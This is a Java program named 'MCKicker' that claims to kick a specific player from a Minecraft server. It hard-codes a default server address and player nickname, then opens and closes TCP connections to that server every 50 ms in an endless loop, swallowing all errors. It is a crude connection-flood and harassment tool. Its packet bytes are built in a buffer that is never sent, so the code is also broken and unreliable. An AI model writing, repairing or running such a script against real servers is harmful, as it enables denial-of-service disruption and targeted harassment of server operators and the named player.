import java.io.*;
import java.net.*;

public class MCKicker {
    public static void main(String[] args) throws Exception {
        String host = args.length > 0 ? args[0] : "SquadMC.exaroton.me";
        int port = args.length > 1 ? Integer.parseInt(args[1]) : 37863;
        String nick = args.length > 2 ? args[2] : "danilfb1234";
        System.out.println("Kicking " + nick + " from " + host + ":" + port);
        System.out.println("Press Ctrl+C to stop");
        int count = 0;
        while (true) {
            try {
                Socket s = new Socket();
                s.connect(new InetSocketAddress(host, port), 2000);
                DataOutputStream out = new DataOutputStream(s.getOutputStream());
                ByteArrayOutputStream buf = new ByteArrayOutputStream();
                DataOutputStream pkt = new DataOutputStream(buf);
                pkt.write(0); pkt.write(0); pkt.write(0); pkt.write(0); pkt.write(0);
                s.close();
                count++;
                System.out.println("[" + count + "] Sent at " + java.time.LocalTime.now());
            } catch (Exception e) {}
            Thread.sleep(50);
        }
    }
}
